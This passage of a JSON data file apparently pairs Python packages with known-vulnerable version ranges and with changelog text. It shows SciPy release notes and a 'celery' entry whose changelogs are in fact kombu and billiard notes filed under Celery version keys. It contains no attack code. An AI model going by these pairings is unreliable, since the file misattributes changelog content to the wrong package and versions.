decompositions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nScipy now includes a new module `scipy.linalg.interpolative`\ncontaining routines for computing interpolative matrix decompositions\n(ID). This feature is based on the ID software package by\nP.G. Martinsson, V. Rokhlin, Y. Shkolnisky, and M. Tygert, previously\nadapted for Python in the PymatrixId package by K.L. Ho.\n\nPolar decomposition\n^^^^^^^^^^^^^^^^^^^\n\nA new function `scipy.linalg.polar`, to compute the polar decomposition\nof a matrix, was added.\n\nBLAS level 3 functions\n^^^^^^^^^^^^^^^^^^^^^^\n\nThe BLAS functions ``symm``, ``syrk``, ``syr2k``, ``hemm``, ``herk`` and\n``her2k`` are now wrapped in `scipy.linalg`.\n\nMatrix functions\n^^^^^^^^^^^^^^^^\n\nSeveral matrix function algorithms have been implemented or updated following\ndetailed descriptions in recent papers of Nick Higham and his co-authors.\nThese include the matrix square root (``sqrtm``), the matrix logarithm\n(``logm``), the matrix exponential (``expm``) and its Frechet derivative\n(``expm_frechet``), and fractional matrix powers (``fractional_matrix_power``).\n\n\n``scipy.optimize`` improvements\n-------------------------------\n\nTrust-region unconstrained minimization algorithms\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``minimize`` function gained two trust-region solvers for unconstrained\nminimization: ``dogleg`` and ``trust-ncg``.\n\n\n``scipy.sparse`` improvements\n-----------------------------\n\nBoolean comparisons and sparse matrices\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAll sparse matrix types now support boolean data, and boolean operations.  Two\nsparse matrices `A` and `B` can be compared in all the expected ways `A < B`,\n`A >= B`, `A != B`, producing similar results as dense Numpy arrays.\nComparisons with dense matrices and scalars are also supported.\n\nCSR and CSC fancy indexing\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nCompressed sparse row and column sparse matrix types now support fancy indexing\nwith boolean matrices, slices, and lists. So where A is a (CSC or CSR) sparse\nmatrix, you can do things like::\n\n    >>> A[A > 0.5] = 1   since Boolean sparse matrices work\n    >>> A[:2, :3] = 2\n    >>> A[[1,2], 2] = 3\n\n\n``scipy.sparse.linalg`` improvements\n------------------------------------\n\nThe new function ``onenormest`` provides a lower bound of the 1-norm of a\nlinear operator and has been implemented according to Higham and Tisseur\n(2000).  This function is not only useful for sparse matrices, but can also be\nused to estimate the norm of products or powers of dense matrices without\nexplicitly building the intermediate matrix.\n\nThe multiplicative action of the matrix exponential of a linear operator\n(``expm_multiply``) has been implemented following the description in Al-Mohy\nand Higham (2011).\n\nAbstract linear operators (`scipy.sparse.linalg.LinearOperator`) can now be\nmultiplied, added to each other, and exponentiated, producing new linear\noperators. This enables easier construction of composite linear operations.\n\n\n``scipy.spatial`` improvements\n------------------------------\n\nThe vertices of a `ConvexHull` can now be accessed via the `vertices` attribute,\nwhich gives proper orientation in 2-D.\n\n\n``scipy.signal`` improvements\n-----------------------------\n\nThe cosine window function ``scipy.signal.cosine`` was added.\n\n\n``scipy.special`` improvements\n------------------------------\n\nNew functions `scipy.special.xlogy` and `scipy.special.xlog1py` were added.\nThese functions can simplify and speed up code that has to calculate\n``x * log(y)`` and give 0 when ``x == 0``.\n\n\n``scipy.io`` improvements\n-------------------------\n\nUnformatted Fortran file reader\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe new class `scipy.io.FortranFile` facilitates reading unformatted\nsequential files written by Fortran code.\n\n``scipy.io.wavfile`` enhancements\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n`scipy.io.wavfile.write` now accepts a file buffer. Previously it only\naccepted a filename.\n\n`scipy.io.wavfile.read` and `scipy.io.wavfile.write` can now handle floating\npoint WAV files.\n\n\n``scipy.interpolate`` improvements\n----------------------------------\n\nB-spline derivatives and antiderivatives\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n`scipy.interpolate.splder` and `scipy.interpolate.splantider` functions\nfor computing B-splines that represent derivatives and antiderivatives\nof B-splines were added.  These functions are also available in the\nclass-based FITPACK interface as ``UnivariateSpline.derivative`` and\n``UnivariateSpline.antiderivative``.\n\n\n``scipy.stats`` improvements\n----------------------------\n\nDistributions now allow using keyword parameters in addition to\npositional parameters in all methods.\n\nThe function `scipy.stats.power_divergence` has been added for the\nCressie-Read power divergence statistic and goodness of fit test.\nIncluded in this family of statistics is the \"G-test\"\n(https://en.wikipedia.org/wiki/G-test).\n\n`scipy.stats.mood` now accepts multidimensional input.\n\nAn option was added to `scipy.stats.wilcoxon` for continuity correction.\n\n`scipy.stats.chisquare` now has an `axis` argument.\n\n`scipy.stats.mstats.chisquare` now has `axis` and `ddof` arguments.\n\n\nDeprecated features\n===================\n\n``expm2`` and ``expm3``\n-----------------------\n\nThe matrix exponential functions `scipy.linalg.expm2` and `scipy.linalg.expm3`\nare deprecated. All users should use the numerically more robust\n`scipy.linalg.expm` function instead.\n\n``scipy.stats`` functions\n-------------------------\n\n`scipy.stats.oneway` is deprecated; `scipy.stats.f_oneway` should be used\ninstead.\n\n`scipy.stats.glm` is deprecated.  `scipy.stats.ttest_ind` is an equivalent\nfunction; more full-featured general (and generalized) linear model\nimplementations can be found in statsmodels.\n\n`scipy.stats.cmedian` is deprecated; ``numpy.median`` should be used instead.\n\n\nBackwards incompatible changes\n==============================\n\nLIL matrix assignment\n---------------------\nAssigning values to LIL matrices with two index arrays now works similarly as\nassigning into ndarrays::\n\n    >>> x = lil_matrix((3, 3))\n    >>> x[[0,1,2],[0,1,2]]=[0,1,2]\n    >>> x.todense()\n    matrix([[ 0.,  0.,  0.],\n            [ 0.,  1.,  0.],\n            [ 0.,  0.,  2.]])\n\nrather than giving the result::\n\n    >>> x.todense()\n    matrix([[ 0.,  1.,  2.],\n            [ 0.,  1.,  2.],\n            [ 0.,  1.,  2.]])\n\nUsers relying on the previous behavior will need to revisit their code.\nThe previous behavior is obtained by ``x[numpy.ix_([0,1,2],[0,1,2])] = ...``.\n\n\nDeprecated ``radon`` function removed\n-------------------------------------\n\nThe ``misc.radon`` function, which was deprecated in scipy 0.11.0, has been\nremoved.  Users can find a more full-featured ``radon`` function in\nscikit-image.\n\n\nRemoved deprecated keywords ``xa`` and ``xb`` from ``stats.distributions``\n--------------------------------------------------------------------------\n\nThe keywords ``xa`` and ``xb``, which were deprecated since 0.11.0, have\nbeen removed from the distributions in ``scipy.stats``.\n\nChanges to MATLAB file readers / writers\n----------------------------------------\n\nThe major change is that 1D arrays in numpy now become row vectors (shape 1, N)\nwhen saved to a MATLAB 5 format file.  Previously 1D arrays saved as column\nvectors (N, 1).  This is to harmonize the behavior of writing MATLAB 4 and 5\nformats, and adapt to the defaults of numpy and MATLAB - for example\n``np.atleast_2d`` returns 1D arrays as row vectors.\n\nTrying to save arrays of greater than 2 dimensions in MATLAB 4 format now raises\nan error instead of silently reshaping the array as 2D.\n\n``scipy.io.loadmat('afile')`` used to look for `afile` on the Python system path\n(``sys.path``); now ``loadmat`` only looks in the current directory for a\nrelative path filename.\n\n\nOther changes\n=============\n\nSecurity fix: ``scipy.weave`` previously used temporary directories in an\ninsecure manner under certain circumstances.\n\nCython is now required to build *unreleased* versions of scipy.\nThe C files generated from Cython sources are not included in the git repo\nanymore.  They are however still shipped in source releases.\n\nThe code base received a fairly large PEP8 cleanup.  A ``tox pep8``\ncommand has been added; new code should pass this test command.\n\nScipy cannot be compiled with gfortran 4.1 anymore (at least on RH5), likely\ndue to that compiler version not supporting entry constructs well.\n\n\nAuthors\n=======\n\nThis release contains work by the following people (contributed at least\none patch to this release, names in alphabetical order):\n\n* Jorge Ca\u00f1ardo Alastuey +\n* Tom Aldcroft +\n* Max Bolingbroke +\n* Joseph Jon Booker +\n* Fran\u00e7ois Boulogne\n* Matthew Brett\n* Christian Brodbeck +\n* Per Brodtkorb +\n* Christian Brueffer +\n* Lars Buitinck\n* Evgeni Burovski +\n* Tim Cera\n* Lawrence Chan +\n* David Cournapeau\n* Dra\u017een Lu\u010danin +\n* Alexander J. Dunlap +\n* endolith\n* Andr\u00e9 Gaul +\n* Christoph Gohlke\n* Ralf Gommers\n* Alex Griffing +\n* Blake Griffith +\n* Charles Harris\n* Bob Helmbold +\n* Andreas Hilboll\n* Kat Huang +\n* Oleksandr (Sasha) Huziy +\n* Gert-Ludwig Ingold +\n* Thouis (Ray) Jones\n* Juan Luis Cano Rodr\u00edguez +\n* Robert Kern\n* Andreas Kloeckner +\n* Sytse Knypstra +\n* Gustav Larsson +\n* Denis Laxalde\n* Christopher Lee\n* Tim Leslie\n* Wendy Liu +\n* Clemens Novak +\n* Takuya Oshima +\n* Josef Perktold\n* Illia Polosukhin +\n* Przemek Porebski +\n* Steve Richardson +\n* Branden Rolston +\n* Skipper Seabold\n* Fazlul Shahriar\n* Leo Singer +\n* Rohit Sivaprasad +\n* Daniel B. Smith +\n* Julian Taylor\n* Louis Thibault +\n* Tomas Tomecek +\n* John Travers\n* Richard Tsai +\n* Jacob Vanderplas\n* Patrick Varilly\n* Pauli Virtanen\n* Stefan van der Walt\n* Warren Weckesser\n* Pedro Werneck +\n* Nils Werner +\n* Michael Wimmer +\n* Nathan Woods +\n* Tony S. Yu +\n\nA total of 65 people contributed to this release.\nPeople with a \"+\" by their names contributed a patch for the first time.\n\n\n\n==========================\n", "1.9.3": "-----------------------\n\n* `5288 <https://github.com/scipy/scipy/pull/5288>`__: BUG: multivariate_normal returns a pdf for values outside its...\n* `13322 <https://github.com/scipy/scipy/pull/13322>`__: Bug: setting iprint=0 hides all output from fmin_l_bfgs_b, but...\n* `13349 <https://github.com/scipy/scipy/pull/13349>`__: BUG: stats: Reformulate loggamma._rvs to handle c << 1.\n* `13411 <https://github.com/scipy/scipy/pull/13411>`__: BUG: fix out-of-bound evaluations in optimize.minimize, powell...\n* `15363 <https://github.com/scipy/scipy/pull/15363>`__: BUG: fix powell evaluated outside limits\n* `15381 <https://github.com/scipy/scipy/pull/15381>`__: BUG: fix stats.rv_histogram for non-uniform bins\n* `16212 <https://github.com/scipy/scipy/pull/16212>`__: stats.mood: correct for when ties are present\n* `16288 <https://github.com/scipy/scipy/pull/16288>`__: BUG: fix a crash in \\`fpknot\\`\n* `16318 <https://github.com/scipy/scipy/pull/16318>`__: MAINT: stats: fix _contains_nan on Pandas Series\n* `16460 <https://github.com/scipy/scipy/pull/16460>`__: Fix ttest permutations\n* `16506 <https://github.com/scipy/scipy/pull/16506>`__: MAINT: fix SHGO extra arguments\n* `16521 <https://github.com/scipy/scipy/pull/16521>`__: BUG: Fix error in error message for incorrect sample dimension...\n* `16525 <https://github.com/scipy/scipy/pull/16525>`__: MAINT: stats.ks_2samp: always emit warning when exact method...\n* `16528 <https://github.com/scipy/scipy/pull/16528>`__: BUG: fix syevr series segfault by explicitly specifying operator...\n* `16562 <https://github.com/scipy/scipy/pull/16562>`__: BUG: optimize: Fix differential_evolution error message.\n* `16573 <https://github.com/scipy/scipy/pull/16573>`__: FIX: \\`odr.Model\\` error with default \\`meta\\` value\n* `16588 <https://github.com/scipy/scipy/pull/16588>`__: FIX: stats: ignore divide-by-zero warnings from Boost binom impl\n* `16590 <https://github.com/scipy/scipy/pull/16590>`__: MAINT: stats.vonmises: wrap rvs to -pi, pi interval\n* `16630 <https://github.com/scipy/scipy/pull/16630>`__: BUG: eps param no effect fixed\n* `16645 <https://github.com/scipy/scipy/pull/16645>`__: MAINT: Ensure Pythran input for lombscargle are contiguous\n* `16649 <https://github.com/scipy/scipy/pull/16649>`__: Detect integer overflow in bivariate splines in fitpackmodule.c,...\n* `16657 <https://github.com/scipy/scipy/pull/16657>`__: BUG: sparse: Fix indexing sparse matrix with empty index arguments.\n* `16669 <https://github.com/scipy/scipy/pull/16669>`__: FIX: spurious divide error with \\`gmean\\`\n* `16701 <https://github.com/scipy/scipy/pull/16701>`__: BUG: fix mutable data types as default arguments in \\`ord.{Data,RealData}\\`\n* `16752 <https://github.com/scipy/scipy/pull/16752>`__: MAINT: stats.boltzmann: correct _shape_info typo\n* `16780 <https://github.com/scipy/scipy/pull/16780>`__: BUG: interpolate: sanity check x and y in make_interp_spline(x,...\n* `16836 <https://github.com/scipy/scipy/pull/16836>`__: MAINT: avoid \\`func_data\\`, it conflicts with system header on...\n* `16872 <https://github.com/scipy/scipy/pull/16872>`__: BUG: interpolate: work array sizes for RectSphereBivariateSpline\n* `16965 <https://github.com/scipy/scipy/pull/16965>`__: BUG: linalg: Fix the XSLOW test test_sgesdd_lwork_bug_workaround()\n* `17043 <https://github.com/scipy/scipy/pull/17043>`__: MAINT: fix small LSMR problem\n* `17090 <https://github.com/scipy/scipy/pull/17090>`__: MAINT: stats.rayleigh: enforce constraint on location\n* `17105 <https://github.com/scipy/scipy/pull/17105>`__: FIX: special: use intended branching for \\`lamv\\` implementation\n* `17166 <https://github.com/scipy/scipy/pull/17166>`__: MAINT: stats.rv_discrete.pmf: should be zero at non-integer argument\n* `17176 <https://github.com/scipy/scipy/pull/17176>`__: REL: Prep for SciPy 1.9.3\n* `17190 <https://github.com/scipy/scipy/pull/17190>`__: BUG: special: Fix two XSLOW test failures.\n* `17193 <https://github.com/scipy/scipy/pull/17193>`__: MAINT: update meson.build to make it work on IBM i system\n* `17200 <https://github.com/scipy/scipy/pull/17200>`__: BLD: fix issue with incomplete threads dependency handling\n* `17204 <https://github.com/scipy/scipy/pull/17204>`__: Keepdims incorrectly documneted fix\n* `17209 <https://github.com/scipy/scipy/pull/17209>`__: MAINT: Handle numpy's deprecation of accepting out-of-bound integers.\n* `17210 <https://github.com/scipy/scipy/pull/17210>`__: BLD: fix invalid shebang for build helper script\n"}}, {"name": "celery", "insecurity": ["<4.4.0rc5", "<5.2.0", "<5.2.2", ">=2.1,<2.2.8", ">=2.3,<2.3.4", ">=2.4,<2.4.4", ">=4.0.0rc3,<4.0.1"], "changelog": {"4.2.0": "=====\n:release-date: 2018-05-21 09:00 A.M IST\n:release-by: Omer Katz\n\n- Now passing ``max_retries``, ``interval_start``, ``interval_step``,\n  ``interval_max`` parameters from broker ``transport_options`` to\n  :meth:`~kombu.Connection.ensure_connection` when returning\n  :meth:`~kombu.Connection.default_connection` (Issue 765).\n\n    Contributed by **Anthony Lukach**.\n\n- Qpid: messages are now durable by default\n\n    Contributed by **David Davis**\n\n- Kombu now requires version 2.10.4 or greater of the redis library,\n  in line with Celery\n\n    Contributed by **Colin Jeanne**\n\n- Fixed ImportError in some environments with outdated simplejson\n\n    Contributed by **Aaron Morris**\n\n- MongoDB: fixed failure on MongoDB versions with an \"-rc\" tag\n\n    Contributed by **dust8**\n\n- Ensure periodic polling frequency does not exceed timeout in\n  virtual transport\n\n    Contributed by **Arcadiy Ivanov**\n\n- Fixed string handling when using python-future module\n\n    Contributed by **John Koehl**\n\n- Replaced \"async\" with \"asynchronous\" in preparation for Python 3.7\n\n    Contributed by **Thomas Achtemichuk**\n\n- Allow removing pool size limit when in use\n\n    Contributed by **Alex Hill**\n\n- Codebase improvements and fixes by:\n\n    - **j2gg0s**\n    - **Jon Dufresne**\n    - **Jonas Lergell**\n    - **Mads Jensen**\n    - **Nicolas Delaby**\n    - **Omer Katz**\n\n- Documentation improvements by:\n\n    - **Felix Yan**\n    - **Harry Moreno**\n    - **Mads Jensen**\n    - **Omer Katz**\n    - **Radha Krishna. S.**\n    - **Wojciech Maty\u015bkiewicz**\n\n.. _version-4.1.0:\n\n", "4.1.0": "=====\n:release-date: 2017-07-17 04:45 P.M MST\n:release-by: Anthony Lukach\n\n- SQS: Added support for long-polling on all supported queries. Fixed bug\n  causing error on parsing responses with no retrieved messages from SQS.\n\n    Contributed by **Anthony Lukach**.\n\n- Async hub: Fixed potential infinite loop while performing todo tasks\n  (Issue celery/celery3712).\n\n- Qpid: Fixed bug where messages could have duplicate ``delivery_tag``\n  (Issue 563).\n\n    Contributed by **bmbouter**.\n\n- MongoDB: Fixed problem with using ``readPreference`` option at pymongo 3.x.\n\n    Contributed by **Mikhail Elovskikh**.\n\n- Re-added support for :pypi:``SQLAlchemy``\n\n    Contributed by **Amin Ghadersohi**.\n\n- SQS: Fixed bug where hostname would default to ``localhost`` if not specified\n  in settings.\n\n    Contributed by **Anthony Lukach**.\n\n- Redis: Added support for reading password from transport URL (Issue 677).\n\n    Contributed by **George Psarakis**.\n\n- RabbitMQ: Ensured safer encoding of queue arguments.\n\n    Contributed by **Robert Kopaczewski**.\n\n- Added fallback to :func:``uuid.uuid5`` in :func:``generate_oid`` if\n  :func:``uuid.uuid3`` fails.\n\n    Contributed by **Bill Nottingham**.\n\n- Fixed race condition and innacurrate timeouts for\n  :class:``kombu.simple.SimpleBase`` (Issue 720).\n\n    Contributed by **c-nichols**.\n\n- Zookeeper: Fixed last chroot character trimming\n\n    Contributed by **Dima Kurguzov**.\n\n- RabbitMQ: Fixed bug causing an exception when attempting to close an\n  already-closed connection (Issue 690).\n\n    Contributed by **eavictor**.\n\n- Removed deprecated use of StopIteration in generators and invalid regex\n  escape sequence.\n\n    Contributed by **Jon Dufresne**.\n\n- Added Python 3.6 to CI testing.\n\n    Contributed by **Jon Dufresne**.\n\n- SQS: Allowed endpoint URL to be specified in the boto3 connection.\n\n    Contributed by **georgepsarakis**.\n\n- SQS: Added support for Python 3.4.\n\n    Contributed by **Anthony Lukach**.\n\n- SQS: ``kombu[sqs]`` now depends on :pypi:`boto3` (no longer using\n  :pypi:`boto)`.\n\n    - Adds support for Python 3.4+\n    - Adds support for FIFO queues (Issue 678) and (Issue celery/celery3690)\n    - Avoids issues around a broken endpoints file (Issue celery/celery3672)\n\n    Contributed by **Mischa Spiegelmock** and **Jerry Seutter**.\n\n- Zookeeper: Added support for delaying task with Python 3.\n\n    Contributed by **Dima Kurguzov**.\n\n- SQS: Fixed bug where :meth:`kombu.transport.SQS.drain_events` did not support\n  callback argument (Issue 694).\n\n    Contributed by **Michael Montgomery**.\n\n- Fixed bug around modifying dictionary size while iterating over it\n  (Issue 675).\n\n    Contributed by **Felix Yan**.\n\n- etcd: Added handling for :exc:`EtcdException` exception rather than\n  :exc:`EtcdError`.\n\n    Contributed by **Stephen Milner**.\n\n- Documentation improvements by:\n\n    - **Mads Jensen**\n    - **Matias Insaurralde**\n    - **Omer Katz**\n    - **Dmitry Dygalo**\n    - **Christopher Hoskin**\n\n.. _version-4.0.2:\n\n", "4.0.2": "=====\n:release-date: 2016-12-15 03:31 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.1.4\n\n    This new version takes advantage of TCP Keepalive settings on Linux,\n    making it better at detecting closed connections, also in failover\n    conditions.\n\n- Redis: Priority was reversed so, e.g. priority 0 became priority 9.\n\n.. _version-4.0.1:\n\n", "4.0.1": "=====\n:release-date: 2016-12-07 06:00 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.1.3\n\n    This new version takes advantage of the new ``TCP_USER_TIMEOUT`` socket option\n    on Linux.\n\n- Producer: Fixed performance degradation when default exchange specified\n  (Issue 651).\n\n- QPid: Switch to using getattr in qpid.Transport.__del__ (Issue 658)\n\n    Contributed by **Patrick Creech**.\n\n- QPid: Now uses monotonic time for timeouts.\n\n- MongoDB: Fixed compatibility with Python 3 (Issue 661).\n\n- Consumer: ``__exit__`` now skips cancelling consumer if connection-related\n  error raised (Issue 670).\n\n- MongoDB: Removes use of natural sort (Issue 638).\n\n    Contributed by **Anton Chaporgin**.\n\n- Fixed wrong keyword argument ``channel`` error (Issue 652).\n\n    Contributed by **Toomore Chiang**.\n\n- Safe argument to ``urllib.quote`` must be bytes on Python 2.x (Issue 645).\n\n- Documentation improvements by:\n\n    - **Carlos Edo**\n    - **Cemre Mengu**\n\n.. _version-4.0:\n\n", "4.0.0": "--------------------\n- Support Sphinx 4.x.\n- Remove dependency to case.\n- Drop support of Python < 3.7.\n- Update to psutil 5.9.0.\n- Add python_requires to enforce Python version.\n- Replace deprecated threading Event.isSet with Event.is_set.\n- Prevent segmentation fault in get_pdeathsig while using ctypes (361).\n- Migrated CI to Github actions.\n- Python 3.10 support added.\n\n\n", "3.6.4.0": "--------------------\n- Issue 309: Add Python 3.9 support to spawnv_passfds()\n- fix 314 \n\n", "3.6.1": "--------------------\n\n- Logging max memory reached at INFO rather than WARNING (255)\n\n-  Pass arguments when wrapping sys.exit (275) \n\n-  Remove win32/py2k special (276) \n\n- Ensure READY messages sent out by exiting worker are consumed prior to it actually existing.\n\n- Pass max_memory_per_child to child worker process (251)\n\n- Fix compatibility with Python 2.7 on Windows (283) \n\n", "3.6.0.0": "--------------------\n\n- Add support of sending parent process death signal.\n\n- Previous fix for handling timeouts caused a problem in warm shutdowns due\n  to use of deepcopy.\n\n  We now use a shallow copy of the cache and do so only when it is needed.\n\n- Cleanup old checks and workarounds for Python versions we no longer support.\n\n", "3.5.0.5": "--------------------\n\n- Fix a crash when handling a timeout.\n- Improve billiard.einfo.Frame compatibility with Python to avoid crashes when using Django.\n- Cleanups.\n\n", "3.5.0.4": "--------------------\n\n- Fix rebuild_ctype losing BufferedWrapper reference on Python 3.\n- Deprecation warning with python 3.6 fixed.\n- Correct spawn start method.\n\n", "3.5.0.3": "--------------------\n\n- Adds Process._authkey alias to .authkey for 2.7 compat.\n- Remove superfluous else clause from max_memory_per_child_check.\n- Document and test all supported Python versions.\n- Extend 'Process' to be compatible with < Py3.5.\n- Use a properly initialized logger in pool.py error logging.\n- _trywaitkill can now kill a whole process group if the worker process declares itself as a group leader.\n- Fix cpython issue 14881 (See https://bugs.python.org/issue14881).\n- Fix for a crash on windows.\n- Fix messaging in case of worker exceeds max memory.\n\n", "3.5.0.2": "--------------------\n\n- max_memory_per_child was measured in kilobytes on Linux, but bytes on\n  *BSD/MacOS, it's now always kilobytes.\n\n- Windows: Adds support for max_memory_per_child, but requires the\n  ``psutil`` package to be installed.\n\n- Fixed bug in ForkingPickler.loadbuf, where it tried to pass\n  a BytesIO instance directly to ``pickle.loads`` on Python 2.7.\n\n", "3.5.0.1": "--------------------\n\n- Connection: Properly handle EINTR (Issue 191).\n\n- Fixed bug with missing CreateProcess for Windows on Python 2.7.\n\n- Adds Process._counter for compatibility with Python <3.5.\n\n", "3.5.0.0": "--------------------\n\n- No longer supports Python 2.6\n\n    You need Python 2.7 or later to use this version of billiard.\n\n- Merged changes from CPython 3.5\n\n", "3.3.0.20": "---------------------\n\n- Pool: Timeouts will attempt to send SIGKILL, but this signal\n  does not exist on Windows.  Replaced with SIGTERM.\n\n", "3.3.0.19": "---------------------\n\n- Pool: Exceptions in user timeout callbacks are now logged instead\n  of crashing the pool.\n\n    Contributed by Pierre Fersing.\n\n- Pool: Exit codes in errors were improperly being represented as signals.\n\n- Pool: ``.map``. and ``.imap`` now working again.\n\n- Now builds on FreeBSD 10.\n\n    Contributed by Michael Fladischer.\n\n", "3.3.0.18": "---------------------\n\n- Now compiles on GNU/kFreeBSD\n\n    Contributed by Michael Fladischer.\n\n- Pool: `AF_PIPE` address fixed so that it works on recent Windows versions\n  in combination with Python 2.7.7.\n\n    Fix contributed by Joshua Tacoma.\n\n- Pool: Fix for `Supervisor object has no attribute _children` error.\n\n    Fix contributed by Andres Riancho.\n\n- Pool: Fixed bug with human_status(None).\n\n- Pool: shrink did not work properly if asked to remove more than 1 process.\n\n\n", "3.3.0.17": "---------------------\n\n- Fixes SemLock on Python 3.4 (Issue 107) when using\n  ``forking_enable(False)``.\n\n- Pool: Include more useful exitcode information when processes exit.\n\n", "3.3.0.16": "---------------------\n\n- Previous release was missing the billiard.py3 package from MANIFEST\n  so the installation would not work on Python 3.\n\n", "3.3.0.15": "---------------------\n\n- Pool: Fixed \"cannot join process not started\" error.\n\n- Now uses billiard.py2 and billiard.py3 specific packages that are installed\n  depending on the python version used.\n\n    This way the installation will not import version specific modules (and\n    possibly crash).\n\n", "3.3.0.14": "---------------------\n\n- Fixed problem with our backwards compatible ``bytes`` wrapper\n  (Issue 103).\n\n- No longer expects frozen applications to have a valid ``__file__``\n  attribute.\n\n    Fix contributed by George Sibble.\n\n", "3.3.0.13": "---------------------\n\n- Fixes compatibility with Python < 2.7.6\n\n- No longer attempts to handle ``SIGBUS``\n\n    Contributed by Vishal Vatsa.\n\n- Non-thread based pool now only handles signals:\n\n    ``SIGHUP``, ``SIGQUIT``, ``SIGTERM``, ``SIGUSR1``,\n    ``SIGUSR2``.\n\n- setup.py: Only show compilation warning for build related commands.\n\n", "3.3.0.12": "---------------------\n\n- Fixed installation for Python 3.\n\n    Contributed by Rickert Mulder.\n\n- Pool: Fixed bug with maxtasksperchild.\n\n    Fix contributed by Ionel Cristian Maries.\n\n- Pool: Fixed bug in maintain_pool.\n\n", "3.3.0.11": "---------------------\n\n- Fixed Unicode error when installing the distribution (Issue 89).\n\n- Daemonic processes are now allowed to have children.\n\n    But note that it will not be possible to automatically\n    terminate them when the process exits.\n\n    See discussion at https://github.com/celery/celery/issues/1709\n\n- Pool:  Would not always be able to detect that a process exited.\n\n\n", "3.3.0.10": "---------------------\n\n- Windows: Fixed problem with missing ``WAITABANDONED_0``\n\n    Fix contributed by Matthias Wagner\n\n- Windows: PipeConnection can now be inherited.\n\n    Fix contributed by Matthias Wagner\n\n", "3.3.0.9": "--------------------\n\n- Temporary workaround for Celery maxtasksperchild issue.\n\n    Fix contributed by Ionel Cristian Maries.\n\n", "3.3.0.8": "--------------------\n\n- Now also sets ``multiprocessing.current_process`` for compatibility\n  with loggings ``processName`` field.\n\n", "3.3.0.7": "--------------------\n\n- Fixed compatibility with PyPy 2.1 + 2.2.\n\n- Fixed problem in pypy detection.\n\n    Fix contributed by Tin Tvrtkovic.\n\n- Now uses ``ctypes.find_library`` instead of hardcoded path to find\n  the macOS CoreServices framework.\n\n    Fix contributed by Moritz Kassner.\n\n\n", "3.3.0.6": "--------------------\n\n- Now works without C extension again.\n\n- New ``_billiard.read(fd, buffer, [len, ])`` function\n  implements os.read with buffer support (new buffer API)\n\n- New pure-python implementation of ``Connection.send_offset``.\n\n", "3.3.0.5": "--------------------\n\n- All platforms except for Windows/PyPy/Jython now requires the C extension.\n\n", "3.3.0.4": "--------------------\n\n- Fixed problem with Python3 and setblocking.\n\n", "3.3.0.3": "--------------------\n\n- Now works on Windows again.\n\n", "3.3.0.2": "--------------------\n\n- ApplyResult.terminate() may be set to signify that the job\n  must not be executed.  It can be used in combination with\n  Pool.terminate_job.\n\n- Pipe/_SimpleQueue: Now supports rnonblock/wnonblock arguments\n  to set the read or write end of the pipe to be nonblocking.\n\n- Pool: Log message included exception info but exception happened\n  in another process so the resulting traceback was wrong.\n\n- Pool: Worker process can now prepare results before they are sent\n  back to the main process (using ``Worker.prepare_result``).\n\n", "3.3.0.1": "--------------------\n\n- Pool: New ``correlation_id`` argument to ``apply_async`` can be\n  used to set a related id for the ``ApplyResult`` object returned:\n\n    >>> r = pool.apply_async(target, args, kwargs, correlation_id='foo')\n    >>> r.correlation_id\n    'foo'\n\n- Pool: New callback `on_process_exit` is called when a pool\n  process exits, with signature ``(pid, exitcode)``.\n\n    Contributed by Daniel M. Taub.\n\n- Pool: Improved the too many restarts detection.\n\n", "3.3.0.0": "--------------------\n\n- Dual code base now runs on Python 2.6+ and Python 3.\n\n- No longer compatible with Python 2.5\n\n- Includes many changes from multiprocessing in 3.4.\n\n- Now uses ``time.monotonic`` when available, also including\n  fallback implementations for Linux and macOS.\n\n- No longer cleans up after receiving SIGILL, SIGSEGV or SIGFPE\n\n    Contributed by Kevin Blackham\n\n- ``Finalize`` and ``register_after_fork`` is now aliases to multiprocessing.\n\n    It's better to import these from multiprocessing directly now\n    so that there aren't multiple registries.\n\n- New `billiard.queues._SimpleQueue` that does not use semaphores.\n\n- Pool: Can now be extended to support using multiple IPC queues.\n\n- Pool: Can now use async I/O to write to pool IPC queues.\n\n- Pool: New ``Worker.on_loop_stop`` handler can be used to add actions\n  at pool worker process shutdown.\n\n    Note that, like all finalization handlers, there is no guarantee that\n    this will be executed.\n\n    Contributed by dmtaub.\n\n", "2.7.3.30": "---------------------\n\n- Fixed ImportError in billiard._ext\n\n", "2.7.3.29": "---------------------\n\n- Compilation: Fixed improper handling of HAVE_SEM_OPEN (Issue 55)\n\n    Fix contributed by Krzysztof Jagiello.\n\n- Process now releases logging locks after fork.\n\n    This previously happened in Pool, but it was done too late\n    as processes logs when they bootstrap.\n\n- Pool.terminate_job now ignores `No such process` errors.\n\n- billiard.Pool entrypoint did not support new arguments\n  to billiard.pool.Pool\n\n- Connection inbound buffer size increased from 1kb to 128kb.\n\n- C extension cleaned up by properly adding a namespace to symbols.\n\n- _exit_function now works even if thread wakes up after gc collect.\n\n", "2.7.3.28": "---------------------\n\n- Pool: Fixed regression that disabled the deadlock\n  fix in 2.7.3.24\n\n- Pool: RestartFreqExceeded could be raised prematurely.\n\n- Process: Include pid in startup and process INFO logs.\n\n", "2.7.3.27": "---------------------\n\n- Manager now works again.\n\n- Python 3 fixes for billiard.connection.\n\n- Fixed invalid argument bug when running on Python 3.3\n\n    Fix contributed by Nathan Wan.\n\n- Ignore OSError when setting up signal handlers.\n\n", "2.7.3.26": "---------------------\n\n- Pool: Child processes must ignore SIGINT.\n\n", "2.7.3.25": "---------------------\n\n- Pool: 2.7.3.24 broke support for subprocesses (Issue 48).\n\n    Signals that should be ignored were instead handled\n    by terminating.\n\n", "2.7.3.24": "---------------------\n\n- Pool:  Make sure finally blocks are called when process exits\n  due to a signal.\n\n    This fixes a deadlock problem when the process is killed\n    while having acquired the shared semaphore.  However, this solution\n    does not protect against the processes being killed, a more elaborate\n    solution is required for that. Hopefully this will be fixed soon in a\n    later version.\n\n- Pool:  Can now use GDB to debug pool child processes.\n\n- Fixes Python 3 compatibility problems.\n\n    Contributed by Albertas 